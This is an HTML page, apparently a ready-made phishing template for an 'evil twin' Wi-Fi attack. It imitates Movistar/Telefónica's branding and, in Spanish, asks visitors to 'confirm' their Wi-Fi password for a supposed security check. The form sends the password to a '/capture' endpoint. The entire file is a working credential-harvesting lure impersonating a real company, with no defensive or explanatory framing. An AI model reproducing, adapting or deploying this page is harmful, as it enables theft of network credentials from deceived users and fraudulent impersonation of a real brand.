<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Movistar - WiFi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Helvetica Neue',Arial,sans-serif;background:#f5f5f5;min-height:100vh;
display:flex;flex-direction:column}
.header{background:#019df4;padding:0;height:60px;display:flex;align-items:center}
.header-inner{max-width:900px;margin:0 auto;width:100%;padding:0 20px;display:flex;align-items:center;justify-content:space-between}
.logo{color:#fff;font-size:1.5em;font-weight:700;letter-spacing:-.5px}
.logo span{font-weight:300}
.header-right{color:rgba(255,255,255,.8);font-size:.8em}
.blue-bar{background:#0066cc;height:4px}
.container{flex:1;display:flex;justify-content:center;align-items:center;padding:32px 16px}
.box{background:#fff;border-radius:8px;width:100%;max-width:400px;
box-shadow:0 2px 16px rgba(0,0,0,.12);overflow:hidden}
.box-top{background:#019df4;padding:24px;text-align:center}
.box-top h1{color:#fff;font-size:1.1em;font-weight:600}
.box-top p{color:rgba(255,255,255,.85);font-size:.82em;margin-top:6px}
.box-body{padding:24px}
.field{margin-bottom:18px}
label{display:block;font-size:.82em;color:#555;margin-bottom:5px;font-weight:500}
input[type=password]{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:4px;
font-size:.92em;outline:none;transition:border .2s}
input[type=password]:focus{border-color:#019df4;box-shadow:0 0 0 2px rgba(1,157,244,.12)}
button{width:100%;background:#019df4;color:#fff;border:none;border-radius:4px;
padding:12px;font-size:.95em;font-weight:600;cursor:pointer;transition:background .2s}
button:hover{background:#007dc7}
.box-foot{text-align:center;font-size:.72em;color:#aaa;padding:12px 16px;border-top:1px solid #f0f0f0}
</style>
</head>
<body>
<div class="header">
  <div class="header-inner">
    <div class="logo">movistar<span>.</span></div>
    <div class="header-right" data-i18n="header_right">Wi-Fi</div>
  </div>
</div>
<div class="blue-bar"></div>
<div class="container">
  <div class="box">
    <div class="box-top">
      <h1 data-i18n="title">Verificacion de seguridad Wi-Fi</h1>
      <p data-i18n="sub">Para continuar navegando, confirme su clave Wi-Fi</p>
    </div>
    <div class="box-body">
      <form method="POST" action="/capture" autocomplete="off">
        <input type="hidden" name="csrf_token" value="">
        <div class="field">
          <label for="password" data-i18n="lbl_pass">Clave Wi-Fi / Contrasena</label>
          <input type="password" id="password" name="password"
                 data-i18n-ph="ph_pass" placeholder="Clave Wi-Fi"
                 required minlength="8" maxlength="63">
        </div>
        <button type="submit" data-i18n="btn">Confirmar</button>
      </form>
    </div>
    <div class="box-foot" data-i18n="footer">&copy; 2024 Telefonica. Todos los derechos reservados.</div>
  </div>
</div>
